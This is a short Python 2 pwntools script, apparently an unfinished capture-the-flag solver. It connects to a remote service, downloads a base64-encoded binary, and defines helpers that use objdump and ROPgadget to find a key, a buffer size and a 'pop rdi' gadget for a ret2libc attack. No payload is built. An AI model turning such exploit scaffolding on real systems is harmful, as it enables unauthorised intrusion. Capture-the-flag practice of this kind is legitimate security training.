from pwn import *
import base64
import os
import sys

context.log_level = "debug"

key = 1
buffer_size = 1
gadget = 1
l = ELF('/root/pwn/libc-database/db/libc6_2.23-0ubuntu10_amd64.so')

def get_key():
	global key

	result = subprocess.check_output('objdump -d trust_binary | grep movq',shell = True)	
	print 'shell result : ' + result
	start = result.find('$')
	end = result.find(',')
	
	key = int(result[start+1:end],16)
	log.info( 'key value = ' + str(key))

def find_buffer_size():
	global buffer_size

	result = subprocess.check_output('objdump -d trust_binary | grep lea',shell = True)
        print 'shell result : ' +  result
        start = result.find('-')
        end = result.find('(')

        buffer_size = int(result[start+1:end],16)
        log.info('buffer_size = ' + str(buffer_size))
	
def find_pop_rdi_gadget():
	global gadget
	result = subprocess.check_output("ROPgadget --binary trust_binary | grep 'pop rdi'", shell = True)
        print 'shell result : ' + result

	end = result.find('pop')
	
        gadget = int(result[0:end].replace(':',''),16)

        log.info('pop rdi; ret; = ' + str(hex(gadget)))

p = remote('1.224.175.32', 9981)

binary = p.recvuntil('=').strip()
binary = base64.b64decode(binary)
print hexdump(binary) 

f = open('./auto_got_binary2', 'wb')
f.write(binary)
f.close()



p.interactive()
